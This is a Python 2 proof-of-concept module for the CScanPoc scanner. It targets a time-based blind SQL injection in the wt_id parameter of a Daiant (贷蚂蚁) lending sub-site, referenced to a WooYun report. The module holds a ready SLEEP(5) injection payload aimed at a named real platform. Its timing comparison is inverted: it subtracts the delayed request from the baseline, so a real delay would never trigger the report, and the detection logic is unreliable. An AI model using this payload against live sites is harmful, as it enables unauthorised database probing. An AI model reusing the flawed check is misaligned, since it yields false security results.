# coding: utf-8
import time

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Daiant_0101'  # 平台漏洞编号
    name = '贷蚂蚁旗下分站时间盲注一枚'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    参数wt_id 伪静态，
    贷蚂蚁旗下分站时间盲注一枚。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=144990
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Daiant(贷蚂蚁)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '22450edb-b735-42b3-a654-7e025656419b'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload1 = "/index.php/Counselor/index/wt_id/3"
            payload2 = "/index.php/Counselor/index/wt_id/3) AND(SELECT * FROM (SELECT(SLEEP(5)))KCcr) AND (3626=3626"
            url = self.target + payload1
            url2 = self.target + payload2
            start_time = time.time()
            _response = requests.get(url)
            end_time1 = time.time()
            _response = requests.get(url2)
            end_time2 = time.time()
            if (end_time1-start_time) - (end_time2-end_time1) > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
